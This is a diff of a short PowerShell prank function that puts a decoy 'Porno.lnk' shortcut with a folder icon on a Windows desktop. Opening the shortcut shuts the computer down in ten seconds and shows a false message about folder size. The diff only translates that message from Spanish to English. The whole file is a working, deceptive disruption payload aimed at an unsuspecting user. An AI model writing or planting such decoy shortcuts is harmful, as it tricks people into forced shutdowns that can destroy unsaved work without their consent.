@@ -1,11 +1,12 @@
 ﻿function New-PornShortcuts
 {
 #.AUTHOR https://raw.githubusercontent.com/Hackstur
+
     $WshShell = New-Object -comObject WScript.Shell
     $DesktopPath = [Environment]::GetFolderPath("Desktop")
     $Shortcut = $WshShell.CreateShortcut("$DesktopPath\Porno.lnk")
     $Shortcut.TargetPath = '"C:\\Windows\\System32\\cmd.exe"'
-    $Shortcut.Arguments = '/k shutdown /S /T 10 /C "La carpeta del porno excede el tama o aconsejado."'
+    $Shortcut.Arguments = '/k shutdown /S /T 10 /C "Your Porno folder exceeds the size limit for NTFS."'
     $Shortcut.WorkingDirectory = '"C:\\"'
     $Shortcut.IconLocation = "C:\WINDOWS\system32\imageres.dll, 3"
     $Shortcut.Save()
